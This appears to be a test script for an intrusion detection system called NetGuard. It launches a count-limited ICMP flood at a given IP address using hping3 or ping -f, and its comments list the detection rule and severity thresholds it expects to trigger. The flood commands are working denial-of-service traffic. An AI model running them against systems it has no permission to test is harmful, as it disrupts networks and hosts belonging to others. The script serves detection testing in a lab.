#!/usr/bin/env bash
# attack_icmp_flood.sh — ICMP Flood attack test script for NetGuard IDPS demonstration
#
# Prerequisites: hping3 (preferred) or a system ping that supports -f flood mode
#   Install hping3: sudo apt-get install hping3
#
# Usage:
#   TARGET_IP=<victim-ip> bash attack_icmp_flood.sh
#   Example: TARGET_IP=192.168.1.100 bash attack_icmp_flood.sh
#
# Expected detection in NetGuard:
#   Attack type : ICMP Flood
#   Rule        : ICMP_FLOOD_001
#   Severity    : Medium (≥ 100 Echo Requests in 3 s window)
#                 High   (≥ 200 in 3 s window)
#                 Critical (≥ 400 in 3 s window, or broadcast destination → Smurf pattern)
#   Confidence  : 100
#   Appears on dashboard within ~5 seconds of script start
#
# Safe-use warning:
#   Run ONLY in an isolated lab/hackathon network you own or have explicit permission to test.
#   ICMP floods consume bandwidth and CPU on the target. Never run against production systems.

TARGET_IP="${TARGET_IP:-}"

if [ -z "$TARGET_IP" ]; then
    echo "ERROR: TARGET_IP is not set." >&2
    echo "Usage: TARGET_IP=<victim-ip> bash $0" >&2
    exit 1
fi

echo "[*] Starting ICMP flood → $TARGET_IP (500 Echo Requests at flood rate)..."

if command -v hping3 >/dev/null 2>&1; then
    # hping3 preferred: explicit ICMP Echo Request, flood rate, count-limited
    sudo hping3 --icmp --flood -c 500 "$TARGET_IP"
else
    # Fallback: system ping flood (requires root on Linux; -f not available on macOS)
    sudo ping -f -c 500 "$TARGET_IP"
fi

echo "[*] Done. Check NetGuard dashboard for ICMP Flood alert (ICMP_FLOOD_001)."
